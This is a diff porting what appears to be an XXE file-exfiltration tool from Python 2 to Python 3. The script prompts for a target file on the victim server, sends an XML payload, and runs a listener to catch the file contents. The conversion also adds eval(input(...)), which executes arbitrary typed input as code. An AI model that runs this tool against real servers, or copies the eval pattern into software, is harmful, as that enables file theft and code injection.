@@ -12,14 +12,14 @@ from lib.AttackSession import AttackSession
 def start_loop(attackSession, args):
     try:
         while True:
-            print "------"
-            targetFile = raw_input("Target File: ")
-            print "[+] Sending XML request..."
+            print("------")
+            targetFile = eval(input("Target File: "))
+            print("[+] Sending XML request...")
             response = attackSession.sendPayload(targetFile, args.interface, args.listenPort)
-            print "[+] Server Response: {}".format(response.status_code)
+            print(("[+] Server Response: {}".format(response.status_code)))
             
     except KeyboardInterrupt:
-        print "\n[!] Exiting..."
+        print("\n[!] Exiting...")
         sys.exit(0)
 
 def parseArgs():
@@ -35,7 +35,7 @@ def parseArgs():
 
 if __name__ == '__main__':
     args = parseArgs()
-    print "[+] Starting server...."
+    print("[+] Starting server....")
     p = Process(target=startServer, kwargs=dict(ip=args.interface, port=args.listenPort, isb64=args.isb64))
     p.start()
     #Hacky way to make sure server is started before jumping in
